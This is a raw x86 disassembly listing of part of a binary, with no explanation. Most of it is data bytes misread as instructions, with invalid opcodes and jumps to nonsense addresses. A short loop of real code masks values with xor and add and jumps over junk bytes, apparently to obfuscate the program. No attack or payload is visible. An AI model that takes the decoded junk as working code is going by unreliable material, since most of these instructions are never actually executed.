  404a07:	ret    0xd11
  404a0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a0b:	fld    QWORD PTR [edi]
  404a0d:	ret    0x4c10
  404a10:	sbb    al,0xac
  404a12:	mov    ah,BYTE PTR [ebp-0x32]
  404a15:	jno    0x404a32
  404a17:	push   ebx
  404a18:	sub    dh,BYTE PTR [eax-0x2a]
  404a1b:	out    0x61,al
  404a1d:	ror    BYTE PTR [esi-0x74],1
  404a20:	rol    DWORD PTR [ecx],cl
  404a22:	jp     0x404a3f
  404a24:	mov    esp,0x31ede29d
  404a29:	test   eax,0xfa8d31cd
  404a2e:	popf   
  404a2f:	enter  0xd032,0xaf
  404a33:	dec    esi
  404a34:	mov    BYTE PTR [eax],cl
  404a36:	stc    
  404a37:	xor    edx,DWORD PTR [ebx]
  404a39:	adc    eax,DWORD PTR [ebp+0x5106d099]
  404a3f:	test   BYTE PTR [edx+0x56],bh
  404a42:	and    al,dl
  404a44:	es std 
  404a46:	sbb    BYTE PTR [ebx],cl
  404a48:	(bad)  
  404a49:	fisttp QWORD PTR [eax]
  404a4b:	xchg   esi,eax
  404a4c:	sbb    al,0x14
  404a4e:	sbb    edx,edi
  404a50:	jge    0x404a3d
  404a52:	jmp    ebx
  404a54:	jno    0x404a96
  404a56:	cmp    edi,0x66fc74a
  404a5c:	cmp    cl,ch
  404a5e:	stc    
  404a5f:	xor    al,0x35
  404a61:	icebp  
  404a62:	lahf   
  404a63:	push   ebp
  404a64:	push   0xbe4a0301
  404a69:	or     bl,BYTE PTR [eax]
  404a6b:	mov    eax,ds:0xd70c3dee
  404a70:	pop    ss
  404a71:	scas   al,BYTE PTR es:[edi]
  404a72:	and    DWORD PTR [edi+ecx*1],0x3b69fb22
  404a79:	mov    dl,0x6d
  404a7b:	into   
  404a7c:	push   0x13
  404a7e:	sbb    bh,bl
  404a80:	sbb    DWORD PTR [ebx-0x50ffaeee],ebx
  404a86:	mov    al,ds:0x55e7e305
  404a8b:	repnz mov edx,0xd933e173
  404a91:	lock js 0xf578d48f
  404a98:	frstor fs:[ebx-0x11]
  404a9c:	loope  0x404ae0
  404a9e:	nop
  404a9f:	inc    ecx
  404aa0:	inc    ebp
  404aa1:	add    eax,0x72529c87
  404aa6:	stos   DWORD PTR es:[edi],eax
  404aa7:	or     eax,0xc712b0f5
  404aac:	call   0xabce7a65
  404ab1:	xor    eax,0xc816c701
  404ab6:	imul   edi,DWORD PTR [ecx+0x51d526e7],0x4f
  404abd:	adc    ah,BYTE PTR [ecx]
  404abf:	fscale 
  404ac1:	xor    esi,DWORD PTR fs:[ebx]
  404ac4:	jmp    0x2226:0xc40fcb76
  404acb:	cld    
  404acc:	pop    es
  404acd:	(bad)  
  404ace:	adc    bh,BYTE PTR [ebx+0x5ec968a1]
  404ad4:	xchg   ebx,eax
  404ad5:	mov    al,cl
  404ad7:	mov    BYTE PTR [edx+0x1e],ah
  404ada:	pop    es
  404adb:	dec    ebp
  404adc:	and    dl,ah
  404ade:	pop    edx
  404adf:	xchg   esi,eax
  404ae0:	lods   eax,DWORD PTR ds:[esi]
  404ae1:	pop    ebx
  404ae2:	and    al,BYTE PTR [eax-0x199e9421]
  404ae8:	add    al,0xf1
  404aea:	and    cl,ch
  404aec:	mov    ss,ebx
  404aee:	mov    dh,0x9b
  404af0:	mov    ?,ebp
  404af2:	mov    cl,0x0
  404af4:	fidiv  DWORD PTR [ecx+0x172df0fd]
  404afa:	xchg   edx,eax
  404afb:	test   al,0x15
  404afd:	popa   
  404afe:	scas   eax,DWORD PTR es:[edi]
  404aff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b00:	xlat   BYTE PTR ds:[ebx]
  404b01:	cs leave 
  404b03:	and    dl,BYTE PTR [ebx]
  404b05:	sub    BYTE PTR [esi],bl
  404b07:	adc    eax,0x73499518
  404b0c:	mov    cl,0x5d
  404b0e:	(bad)  
  404b0f:	cwde   
  404b10:	jb     0x404b5d
  404b12:	sbb    ah,BYTE PTR [edx-0x7]
  404b15:	add    ah,BYTE PTR [edi+0x72]
  404b18:	inc    esi
  404b19:	xchg   esp,eax
  404b1a:	(bad)  
  404b1b:	fwait
  404b1c:	mov    ebx,0x9928c2d1
  404b21:	sar    DWORD PTR [ebp-0x6e2705a9],1
  404b27:	fs sbb al,dh
  404b2a:	push   0x791caaea
  404b2f:	scas   eax,DWORD PTR es:[edi]
  404b30:	push   edx
  404b31:	push   0x77
  404b33:	xchg   edi,eax
  404b34:	mov    eax,ds:0xfa5c262d
  404b39:	adc    DWORD PTR [edx-0x2a2c4495],ebx
  404b3f:	sub    DWORD PTR [esi+ecx*4],ebp
  404b42:	clc    
  404b43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b44:	arpl   WORD PTR [esi+0x49],dx
  404b47:	rcr    BYTE PTR [ebp+esi*4-0x3ea05bca],1
  404b4e:	cmp    al,0x78
  404b50:	(bad)  
  404b51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b52:	inc    esp
  404b53:	js     0x404bc7
  404b55:	inc    ecx
  404b56:	mov    al,0xcb
  404b58:	sub    edi,esi
  404b5a:	repz icebp 
  404b5c:	mov    dh,0x70
  404b5e:	icebp  
  404b5f:	fld    QWORD PTR [ecx+0x2df02e5f]
  404b65:	pusha  
  404b66:	cmp    eax,0xffab6e2d
  404b6b:	inc    esp
  404b6c:	push   ebp
  404b6d:	lods   eax,DWORD PTR ds:[esi]
  404b6e:	shr    cl,1
  404b70:	stos   DWORD PTR es:[edi],eax
  404b71:	retf   
  404b72:	lds    edx,FWORD PTR [esi-0x6789c9a7]
  404b78:	xor    BYTE PTR [ecx-0x15],0x18
  404b7c:	cmp    DWORD PTR [eax],0x76
  404b7f:	repz add dh,BYTE PTR [ecx-0x22]
  404b83:	mov    ah,0x2d
  404b85:	jae    0x404b75
  404b87:	pop    es
  404b88:	dec    edi
  404b89:	pop    es
  404b8a:	sub    cl,BYTE PTR [eax+esi*2]
  404b8d:	add    eax,0x2c7baf1a
  404b92:	das    
  404b93:	clc    
  404b94:	mov    ebx,0x284acf8b
  404b99:	add    dh,BYTE PTR [eax]
  404b9b:	add    bl,ah
  404b9d:	pop    edx
  404b9e:	(bad)  
  404ba0:	sbb    BYTE PTR [eax-0x3f],ah
  404ba3:	aad    0xe6
  404ba5:	sub    eax,eax
  404ba7:	repnz adc ah,BYTE PTR [esi+edx*1]
  404bab:	adc    BYTE PTR [ecx],0xaf
  404bae:	add    BYTE PTR [esi-0xb55f75],bh
  404bb4:	pusha  
  404bb5:	mov    dl,0xa3
  404bb7:	or     BYTE PTR [esp+edx*8],cl
  404bba:	adc    cl,bh
  404bbc:	stc    
  404bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bbe:	add    ah,al
  404bc0:	sub    ebx,esp
  404bc2:	push   ebp
  404bc3:	cmp    BYTE PTR [ebp-0x6e],0xa2
  404bc7:	dec    eax
  404bc8:	mov    ds:0x48b988ec,al
  404bcd:	iret   
  404bce:	sub    DWORD PTR [edi+0x12],esp
  404bd1:	mov    esi,0x18fe7072
  404bd6:	int    0xcc
  404bd8:	jae    0x404be6
  404bda:	mov    dl,0x38
  404bdc:	ret    
  404bdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bde:	or     ebx,DWORD PTR [edi]
  404be0:	fdivrp st(3),st
  404be2:	adc    al,0x6c
  404be4:	adc    eax,0xe6b70c86
  404be9:	daa    
  404bea:	ja     0x404c1e
  404bec:	dec    ebx
  404bed:	pop    ebp
  404bee:	mov    al,ds:0x79c3a089
  404bf3:	inc    eax
  404bf4:	xchg   esp,eax
  404bf5:	aaa    
  404bf6:	sbb    al,0x3c
  404bf8:	adc    ah,BYTE PTR [esi-0x7bcaf49f]
  404bfe:	fisttp QWORD PTR ds:0xfac7a208
  404c04:	stc    
  404c05:	and    BYTE PTR [edi-0x5f],dl
  404c08:	repz cli 
  404c0a:	jmp    0x404bf0
  404c0c:	fild   WORD PTR [edx-0x42]
  404c0f:	mov    edx,0xa585ccfb
  404c14:	aaa    
  404c15:	sub    al,0x4b
  404c17:	fs ret 0x547f
  404c1b:	ins    DWORD PTR es:[edi],dx
  404c1c:	aas    
  404c1d:	loop   0x404c62
  404c1f:	add    DWORD PTR [esi],eax
  404c21:	in     eax,0xab
  404c23:	mov    al,ds:0xadd5b384
  404c28:	xlat   BYTE PTR ds:[ebx]
  404c29:	rol    DWORD PTR [eax-0x63b415bc],0x82
  404c30:	mov    edi,0xf810cd30
  404c35:	push   esi
  404c36:	jge    0x404c37
  404c38:	mov    bh,0xe1
  404c3a:	(bad)  
  404c3b:	mov    esi,0x33be5793
  404c40:	cwde   
  404c41:	int    0xeb
  404c43:	std    
  404c44:	mov    WORD PTR [edi+eax*8+0x66],es
  404c48:	(bad)  
  404c49:	clc    
  404c4a:	ins    DWORD PTR es:[edi],dx
  404c4b:	add    al,0xf4
  404c4d:	icebp  
  404c4e:	rcr    DWORD PTR [edi],0xcf
  404c51:	push   edx
  404c52:	js     0x404c87
  404c54:	cmp    ebx,ebp
  404c56:	ret    0x77ad
  404c59:	or     BYTE PTR [edi-0x35decd19],ah
  404c5f:	loope  0x404c7e
  404c61:	mov    al,ds:0x1753c96c
  404c66:	data16 jmp 0x404c5b
  404c69:	and    eax,0x50b3016b
  404c6e:	dec    edx
  404c6f:	mov    esp,0x1da3b995
  404c74:	sub    al,0xa5
  404c76:	stc    
  404c77:	or     ebp,DWORD PTR [ebx]
  404c79:	fwait
  404c7a:	cmp    eax,0xc440b560
  404c7f:	(bad)  
  404c80:	int3   
  404c81:	fwait
  404c82:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404c84:	and    al,0x9c
  404c86:	xchg   ecx,eax
  404c87:	(bad)  
  404c88:	lock dec esi
  404c8a:	popa   
  404c8b:	cmc    
  404c8c:	retf   0x5ce7
  404c8f:	pop    ss
  404c90:	mov    cl,0x39
  404c92:	push   esi
  404c93:	int3   
  404c94:	and    bl,BYTE PTR gs:[ecx+0x76]
  404c98:	stc    
  404c99:	js     0x404c3a
  404c9b:	sar    DWORD PTR [esi],cl
  404c9d:	stos   BYTE PTR es:[edi],al
  404c9e:	imul   edx,DWORD PTR [ebp-0xc],0xe623fb3d
  404ca5:	pop    edi
  404ca6:	xchg   ecx,eax
  404ca7:	dec    esp
  404ca8:	mov    edi,eax
  404caa:	jo     0x404ca8
  404cac:	adc    edi,DWORD PTR [edx+0xa]
  404caf:	push   ebx
  404cb0:	pop    es
  404cb1:	xchg   ebx,eax
  404cb2:	inc    ebp
  404cb3:	fs jmp 0xdd47:0x458fa27e
  404cbb:	inc    ebp
  404cbc:	mov    al,ds:0x1b2dbfb2
  404cc1:	xor    ah,BYTE PTR [edx+0x6e04baf1]
  404cc7:	cdq    
  404cc8:	mov    WORD PTR [ebx-0x6a4c4840],ds
  404cce:	dec    ebp
  404ccf:	cmp    edx,eax
  404cd1:	out    dx,eax
  404cd2:	cwde   
  404cd3:	stos   DWORD PTR es:[edi],eax
  404cd4:	push   ds
  404cd5:	lahf   
  404cd6:	push   0x3e2ee3b2
  404cdb:	or     ah,BYTE PTR [eax]
  404cdd:	mov    ecx,0xbdd7807c
  404ce2:	mov    WORD PTR [eax-0x58],ss
  404ce5:	and    bl,bl
  404ce7:	cs push ds
  404ce9:	stos   BYTE PTR es:[edi],al
  404cea:	repnz fsubr QWORD PTR [ecx]
  404ced:	or     al,BYTE PTR [esi]
  404cef:	xchg   ecx,eax
  404cf0:	clc    
  404cf1:	fcmovbe st,st(4)
  404cf3:	inc    ebp
  404cf4:	aaa    
  404cf5:	xor    al,BYTE PTR [ebp-0x5ef55613]
  404cfb:	mov    al,ds:0x75d6927
  404d00:	jg     0x404cb8
  404d02:	inc    eax
  404d03:	cmp    al,0xd0
  404d05:	lea    ebp,[ecx+0x335ecb2]
  404d0b:	mov    edi,0x42e6ff05
  404d11:	add    BYTE PTR [eax+0xe],bl
  404d14:	add    BYTE PTR [eax],al
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e6eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax+0x37]
  404d39:	mov    ebp,0x2e968b16
  404d3e:	jo     0x404db0
  404d40:	cmp    eax,0xcf70707d
  404d45:	into   
  404d46:	stc    
  404d47:	jg     0x404d41
  404d49:	adc    DWORD PTR ds:0xb2016819,esi
  404d4f:	cmp    eax,0x72746e6f
  404d54:	jnp    0x404d2e
  404d56:	pop    ebp
  404d57:	into   
  404d58:	mov    dh,0xc7
  404d5a:	inc    eax
  404d5b:	hlt    
  404d5c:	(bad)  
  404d5d:	xchg   ebx,eax
  404d5e:	dec    ebp
  404d5f:	lea    ebp,[esi-0x2a46de1d]
  404d65:	jno    0x404de6
  404d67:	sbb    DWORD PTR [ebp-0x35e1d5e2],eax
  404d6d:	shl    ch,cl
  404d6f:	test   DWORD PTR [edx-0x69],edx
  404d72:	mov    WORD PTR [edi+esi*2+0x27],fs
  404d76:	sub    BYTE PTR [ecx+0x2179fb96],bl
  404d7c:	fwait
  404d7d:	jmp    0x9c5a1058
  404d82:	outs   dx,DWORD PTR ds:[esi]
  404d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d84:	imul   esi,edx,0xca63ecdc
  404d8a:	js     0x404db1
  404d8c:	fld    DWORD PTR [eax+0x2c63c71f]
  404d92:	sub    al,dl
  404d94:	mov    cs,WORD PTR [eax+0x2d]
  404d97:	int    0x6f
  404d99:	add    DWORD PTR [edi+0x334a7610],eax
  404d9f:	(bad)  [ebx-0x46deb2]
  404da5:	cwde   
  404da6:	in     eax,0x7c
  404da8:	cs jo  0x404dcc
  404dab:	outs   dx,DWORD PTR ds:[esi]
  404dac:	jno    0x404d8c
  404dae:	arpl   WORD PTR [edi+0x27],cx
  404db1:	imul   DWORD PTR [ebx-0x41]
  404db4:	test   al,0x70
  404db6:	mov    ds:0x60dcc8fa,al
  404dbb:	inc    ebp
  404dbc:	cmp    esp,ebx
  404dbe:	pop    ss
  404dbf:	fcom   st(0)
  404dc1:	pop    ss
  404dc2:	pop    edi
  404dc3:	dec    ebp
  404dc4:	pop    edi
  404dc5:	sub    eax,0xc371f85d
  404dca:	sbb    al,ch
  404dcc:	cld    
  404dcd:	stc    
  404dce:	jbe    0x404e3b
  404dd0:	cmp    eax,0xa94e3e26
  404dd5:	jmp    0xea9e3332
  404dda:	fisub  DWORD PTR [edx]
  404ddc:	pop    ss
  404ddd:	pop    esi
  404dde:	xor    ebx,DWORD PTR [edx+0x1bb6ed15]
  404de4:	aam    0x19
  404de6:	push   ds
  404de7:	les    ecx,FWORD PTR [edi]
  404de9:	in     al,0xd6
  404deb:	or     edi,DWORD PTR [edi+eiz*4]
  404dee:	jo     0x404e44
  404df0:	mov    eax,0xb698a016
  404df5:	ins    DWORD PTR es:[edi],dx
  404df6:	inc    ebx
  404df7:	push   edx
  404df8:	pusha  
  404df9:	mov    ah,0xaf
  404dfb:	push   eax
  404dfc:	jg     0x404df1
  404dfe:	push   cs
  404dff:	inc    esp
  404e00:	je     0x404d9a
  404e02:	int    0x2b
  404e04:	ror    DWORD PTR [eax+0x2d],1
  404e07:	es das 
  404e09:	sub    al,0x17
  404e0b:	retf   0x6e7b
  404e0e:	mov    dl,0x47
  404e10:	dec    ebx
  404e11:	neg    DWORD PTR [eax+0x5f43f03b]
  404e17:	in     al,0xdd
  404e19:	adc    al,BYTE PTR [esi+ebp*4]
  404e1c:	lods   eax,DWORD PTR ds:[esi]
  404e1d:	sub    al,0xd8
  404e1f:	push   edx
  404e20:	std    
  404e21:	sbb    ah,BYTE PTR [edi+ebp*2+0x50]
  404e25:	in     al,0xde
  404e27:	cmp    edi,DWORD PTR [eax]
  404e29:	dec    esp
  404e2a:	popa   
  404e2b:	inc    ebp
  404e2c:	xchg   esp,eax
  404e2d:	sub    dl,al
  404e2f:	ins    DWORD PTR es:[edi],dx
  404e30:	xchg   ebx,eax
  404e31:	cli    
  404e32:	inc    esi
  404e33:	mov    ds:0x15362e05,al
  404e38:	ss inc ebp
  404e3a:	in     al,dx
  404e3b:	xor    eax,DWORD PTR [ecx]
  404e3d:	cmc    
  404e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e3f:	jbe    0x404eaa
  404e41:	pushf  
  404e42:	dec    ebx
  404e43:	pop    es
  404e44:	jae    0x404e6a
  404e46:	adc    bh,dl
  404e48:	add    edi,DWORD PTR [edi+0x6a]
  404e4b:	addr16 pop esi
  404e4d:	pop    edx
  404e4e:	jne    0x404de7
  404e50:	es mov esp,0xd0eab51d
  404e56:	enter  0xfaac,0x54
  404e5a:	fldcw  WORD PTR [edi+0x56]
  404e5d:	inc    eax
  404e5e:	push   ebx
  404e5f:	or     esi,esi
  404e61:	dec    ebp
  404e62:	sub    BYTE PTR [eax+0x3fd13503],0x48
  404e69:	scas   al,BYTE PTR es:[edi]
  404e6a:	call   0xc175:0x52e1419c
  404e71:	sub    dl,BYTE PTR ds:[edi]
  404e74:	cmp    al,0x9d
  404e76:	cwde   
  404e77:	adc    eax,0x5c664121
  404e7c:	fcmovbe st,st(0)
  404e7e:	sar    BYTE PTR [eax+0x19],cl
  404e81:	outs   dx,BYTE PTR ds:[esi]
  404e82:	mov    eax,0x9f8912a3
  404e87:	ror    BYTE PTR [ebx+0x63824f7a],cl
  404e8d:	imul   edx,DWORD PTR [ebx+edi*2],0xc8f1adf8
  404e94:	outs   dx,BYTE PTR ds:[esi]
  404e95:	dec    esi
  404e96:	xor    esp,DWORD PTR [edi+0x554e195b]
  404e9c:	lea    edi,[esp+edx*4-0x10]
  404ea0:	ins    BYTE PTR es:[edi],dx
  404ea1:	xchg   ecx,eax
  404ea2:	int    0x55
  404ea4:	add    DWORD PTR [ecx-0xd3486e4],ecx
  404eaa:	(bad)  
  404eab:	lods   eax,DWORD PTR ds:[esi]
  404eac:	xor    al,0xe0
  404eae:	sub    eax,esp
  404eb0:	pop    ss
  404eb1:	outs   dx,BYTE PTR ds:[esi]
  404eb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eb3:	jg     0x404e4c
  404eb5:	and    al,0x3
  404eb7:	jb     0x404edb
  404eb9:	cmpxchg al,ch
  404ebc:	jbe    0x404ecf
  404ebe:	mov    ch,0xcf
  404ec0:	lods   al,BYTE PTR ds:[esi]
  404ec1:	mov    ebx,0x3c1f1aa1
  404ec6:	add    eax,0xc43e7559
  404ecb:	mov    ch,0xc8
  404ecd:	loopne 0x404e7e
  404ecf:	push   edx
  404ed0:	jb     0x404ee0
  404ed2:	mov    esi,0x4239b6cb
  404ed7:	inc    esp
  404ed8:	jmp    0xc9c5:0x21a21f7b
  404edf:	dec    edx
  404ee0:	sub    DWORD PTR [edi+0x589dd1ad],edi
  404ee6:	pop    esp
  404ee7:	hlt    
  404ee8:	call   0x5471:0xa6be1527
  404eef:	fist   DWORD PTR [esi+0xc]
  404ef2:	and    al,0xd3
  404ef4:	inc    esp
  404ef5:	outs   dx,BYTE PTR ds:[esi]
  404ef6:	cli    
  404ef7:	rcr    DWORD PTR [edx-0x6c700169],1
  404efd:	push   0xa2349bf6
  404f02:	inc    ebx
  404f03:	ins    DWORD PTR es:[edi],dx
  404f04:	(bad)  
  404f05:	fbstp  TBYTE PTR [ebp-0x67]
  404f08:	call   0x8987f566
  404f0d:	inc    edx
  404f0e:	lock adc ebx,DWORD PTR [edi+edx*4]
  404f12:	or     eax,0x541c6fd6
  404f17:	pop    ecx
  404f18:	push   ebp
  404f19:	pop    ds
  404f1a:	push   ebx
  404f1b:	sbb    eax,0x76e9961e
  404f20:	cmp    al,0x1e
  404f22:	xor    DWORD PTR [edx+0x4f],esp
  404f25:	inc    esi
  404f26:	call   0xd0cd:0x91a39f5e
  404f2d:	mov    eax,0xfda7256f
  404f32:	mov    eax,0xfd2e8a08
  404f37:	xor    DWORD PTR [ecx-0x5aa80637],ecx
  404f3d:	pop    ebx
  404f3e:	mov    cl,0x6
  404f40:	xchg   edi,eax
  404f41:	sti    
  404f42:	in     eax,0x1f
  404f44:	pop    esi
  404f45:	inc    edi
  404f46:	pushf  
  404f47:	or     eax,0xd96dcc5a
  404f4c:	dec    eax
  404f4d:	repz in eax,dx
  404f4f:	hlt    
  404f50:	mov    dl,0xb
  404f52:	into   
  404f53:	js     0x404f61
  404f55:	into   
  404f56:	push   0x6ca3dd1f
  404f5b:	js     0x404fa7
  404f5d:	nop
  404f5e:	shr    BYTE PTR [esi],cl
  404f60:	push   0xac3996d1
  404f65:	div    BYTE PTR [edi-0x6d]
  404f68:	into   
  404f69:	mov    ebx,0x7b0d114d
  404f6e:	mov    al,0x20
  404f70:	sub    eax,0x8b749d9
  404f75:	add    ecx,DWORD PTR [ebx+0x2f5d1b45]
  404f7b:	mov    bh,0xd9
  404f7d:	inc    edi
  404f7e:	mov    ecx,0x89a142c
  404f83:	sbb    ebp,DWORD PTR [eax+0x3f]
  404f86:	fmul   QWORD PTR [ebx]
  404f88:	dec    esi
  404f89:	mov    BYTE PTR [eax+0x51],dl
  404f8c:	ds stos BYTE PTR es:[edi],al
  404f8e:	pop    ecx
  404f8f:	out    dx,al
  404f90:	cmc    
  404f91:	mov    esi,0x28890e6f
  404f96:	ror    BYTE PTR [esi+ecx*4+0x62afe056],1
  404f9d:	or     edx,ebp
  404f9f:	pop    ebx
  404fa0:	popa   
  404fa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fa2:	fisttp DWORD PTR [eax+0x51]
  404fa5:	fisubr WORD PTR ds:0x6d5f5a31
  404fab:	jmp    FWORD PTR [ebx]
  404fad:	cdq    
  404fae:	mov    BYTE PTR [ebx-0x5],dl
  404fb1:	inc    esi
  404fb2:	mov    ebp,0x1a2a696f
  404fb7:	mov    bl,0xfa
  404fb9:	fisttp DWORD PTR [ebx+edx*8-0x3]
  404fbd:	lods   eax,DWORD PTR ds:[esi]
  404fbe:	pop    ss
  404fbf:	mov    dh,0x2a
  404fc1:	push   es
  404fc2:	mov    dl,0xd1
  404fc4:	inc    edi
  404fc5:	dec    edx
  404fc6:	arpl   WORD PTR ds:0x20f7b049,sp
  404fcc:	push   esi
  404fcd:	mov    DWORD PTR [ecx+0x775784ce],eax
  404fd3:	mov    bl,al
  404fd5:	fisub  WORD PTR [edx+0xbf3c9c3]
  404fdb:	xlat   BYTE PTR ds:[ebx]
  404fdc:	and    DWORD PTR [ecx-0x32d923ce],edx
  404fe2:	add    ah,al
  404fe4:	pop    ss
  404fe5:	aad    0xae
  404fe7:	pop    ecx
  404fe8:	scas   eax,DWORD PTR es:[edi]
  404fe9:	fwait
  404fea:	fs loopne 0x404ff2
  404fed:	dec    edx
  404fee:	inc    ebp
  404fef:	fiadd  DWORD PTR [edi-0x3cf3bacd]
  404ff5:	dec    esp
  404ff6:	mov    al,0xdb
  404ff8:	call   0xd3435ff1
  404ffd:	cmp    ebx,ecx
  404fff:	jmp    0x404fe7
  405001:	fnstenv [eax-0x6968f615]
  405007:	push   es
  405008:	mov    al,0x13
  40500a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40500b:	(bad)  
  40500c:	sub    edi,DWORD PTR [edx+edx*4]
  40500f:	inc    ebp
  405010:	stc    
  405011:	adc    eax,edx
  405013:	cmp    eax,0x1f884003
  405018:	pop    ds
  405019:	or     eax,0x5a3779e8
  40501e:	in     al,0xb
  405020:	xchg   esi,eax
  405021:	jne    0x405006
  405023:	push   0xffffff89
  405025:	pop    esp
  405026:	cmp    DWORD PTR [eax+ebp*4-0x74bdb956],esi
  40502d:	jl     0x404fb3
  40502f:	aad    0x5f
  405031:	mov    eax,0x96bfa400
  405036:	pop    ds
  405037:	add    bl,BYTE PTR [edx+0x71]
  40503a:	enter  0x7f32,0x23
  40503e:	int    0xf3
  405040:	adc    eax,0x63b74093
  405045:	xchg   ebp,eax
  405046:	cmp    DWORD PTR [edx+eax*4],ebx
  405049:	leave  
  40504a:	repz cli 
  40504c:	and    cl,cl
  40504e:	xchg   esp,eax
  40504f:	sbb    BYTE PTR [ebp-0x73dd5a4d],ah
  405055:	xchg   esi,eax
  405056:	or     eax,0xfc2bb08
  40505b:	and    al,0x9
  40505d:	adc    eax,0xf6840758
  405062:	scas   eax,DWORD PTR es:[edi]
  405063:	pop    ds
  405064:	and    DWORD PTR [ecx],ebp
  405066:	ins    DWORD PTR es:[edi],dx
  405067:	ds cmp dh,dh
  40506a:	sub    eax,esp
  40506c:	popfw  
  40506e:	hlt    
  40506f:	dec    ebx
  405070:	je     0x405010
  405072:	cwde   
  405073:	push   ebx
  405074:	inc    BYTE PTR [esi+0x13]
  405077:	mov    ds:0x29c503ce,al
  40507c:	adc    DWORD PTR [ebx+0x27],0x3bc5d759
  405083:	mov    ah,0xdf
  405085:	adc    al,0x79
  405087:	mov    eax,DWORD PTR [ebp-0xc]
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	rcr    DWORD PTR [eax],0x2b
  405133:	adc    eax,0x702b53fe
  405138:	jo     0x405177
  40513a:	jge    0x4051ac
  40513c:	jo     0x40519a
  40513e:	mulps  xmm3,XMMWORD PTR [ecx]
  405141:	test   DWORD PTR [eax],ebp
  405143:	les    ebp,FWORD PTR [edx+0x17c1fec9]
  405149:	out    0xa1,al
  40514b:	das    
  40514c:	out    dx,al
  40514d:	mov    ebx,0x73c895c9
  405152:	push   0xffffff9e
  405154:	sub    eax,0x36cdf0d6
  405159:	sbb    BYTE PTR [edi],0xc3
  40515c:	jno    0x4050de
  40515e:	fisubr DWORD PTR [esi+0x6d4b0236]
  405164:	je     0x4051de
  405166:	jmp    0x4051d9
  405168:	adc    eax,0xe8a9dab2
  40516d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40516e:	dec    ebp
  40516f:	mov    al,0x4d
  405171:	mov    bh,0x97
  405173:	ror    DWORD PTR [eax],1
  405175:	xor    esi,edi
  405177:	int3   
  405178:	data16 aam 0xb8
  40517b:	pop    esp
  40517c:	les    edi,FWORD PTR [edi]
  40517e:	xchg   ebp,eax
  40517f:	xchg   edi,eax
  405180:	or     BYTE PTR [edi],bl
  405182:	jle    0x4051dc
  405184:	popf   
  405185:	cmp    ah,BYTE PTR [eax-0x4dcd3262]
  40518b:	jmp    0x22268b41
  405190:	xchg   dl,al
  405192:	pusha  
  405193:	push   eax
  405194:	(bad)  
  405195:	cmp    al,BYTE PTR ds:0xa6091b9b
  40519b:	add    DWORD PTR [ebp-0x25],edx
  40519e:	rcr    esp,1
  4051a0:	push   ds
  4051a1:	nop    esi
  4051a4:	jl     0x4051a1
  4051a6:	fbld   TBYTE PTR [edi-0x29]
  4051a9:	adc    BYTE PTR [eax],0x5f
  4051ac:	jo     0x405225
  4051ae:	mov    ds:0xf8427a99,al
  4051b3:	dec    edx
  4051b4:	repnz out 0xd5,al
  4051b7:	mov    ss,WORD PTR [ecx+0x61]
  4051ba:	jmp    0x587b27f0
  4051bf:	add    esi,DWORD PTR [eax]
  4051c1:	pushf  
